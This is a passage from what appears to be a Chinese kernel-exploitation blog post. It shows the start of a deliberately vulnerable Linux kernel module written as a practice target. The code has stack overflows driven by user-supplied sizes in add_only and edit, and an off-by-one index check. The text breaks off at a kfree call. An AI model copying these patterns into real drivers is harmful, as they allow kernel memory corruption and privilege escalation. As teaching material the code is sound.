<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Kernel01 - cnitlrtの博客</title><meta name="Description" content="内核系列-01 （持续更新中..."><meta property="og:title" content="Kernel01" />
<meta property="og:description" content="内核系列-01 （持续更新中..." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cnitlrt.github.io/kernel01/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="" />
<meta property="article:published_time" content="2023-11-09T09:15:58+08:00" />
<meta property="article:modified_time" content="2024-12-20T07:55:33+08:00" /><meta property="og:site_name" content="My cool site" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>

<meta name="twitter:title" content="Kernel01"/>
<meta name="twitter:description" content="内核系列-01 （持续更新中..."/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cnitlrt.github.io/kernel01/" /><link rel="prev" href="https://cnitlrt.github.io/friend/" /><link rel="next" href="https://cnitlrt.github.io/english/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Kernel01",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/cnitlrt.github.io\/kernel01\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                            "width":  3200 ,
                            "height":  2048 
                        }],"genre": "page","wordcount":  25417 ,
        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2024-12-20T07:55:33+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/cnitlrt.github.io\/images\/avatar.jpg",
                    "width":  1080 ,
                    "height":  1080 
                }},"author": {
                "@type": "Person",
                "name": "cnitlrt"
            },"description": "内核系列-01 （持续更新中..."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><a class="menu-item" href="/friend/"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a class="menu-item" href="/friend/" title="">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Kernel01</h1><div class="content" id="content"><h2 id="例子">例子</h2>
<p>开启 CONFIG_MEMCG_KMEM 等保护机制</p>
<h3 id="1c">1.c</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/delay.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;Dual BSD/GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ADD  0x20
</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEL 0x30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SHOW   0x40
</span></span></span><span class="line"><span class="cl"><span class="cp">#define EDIT   0x50
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LIST 0x66
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADDO  0x77
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADDA  0x88
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="o">*</span><span class="n">addrList</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">add_args</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">del_args</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">show_args</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">edit_args</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">my_struct</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">cache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="k">struct</span> <span class="n">add_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">GFP_KERNEL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">add_only</span><span class="p">(</span><span class="k">struct</span> <span class="n">add_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// struct page *pg;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="mh">0x200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="nf">kmem_cache_alloc</span><span class="p">(</span><span class="n">cache</span><span class="p">,</span><span class="n">GFP_KERNEL_ACCOUNT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">add_account</span><span class="p">(</span><span class="k">struct</span> <span class="n">add_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span><span class="n">GFP_KERNEL_ACCOUNT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">            <span class="n">addrList</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">edit</span><span class="p">(</span><span class="k">struct</span> <span class="n">edit_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="o">||</span> <span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">copy_from_user</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">buf</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span><span class="n">temp</span><span class="p">,</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="k">struct</span> <span class="n">del_args</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="o">||</span> <span class="o">!</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">(</span><span class="n">addrList</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
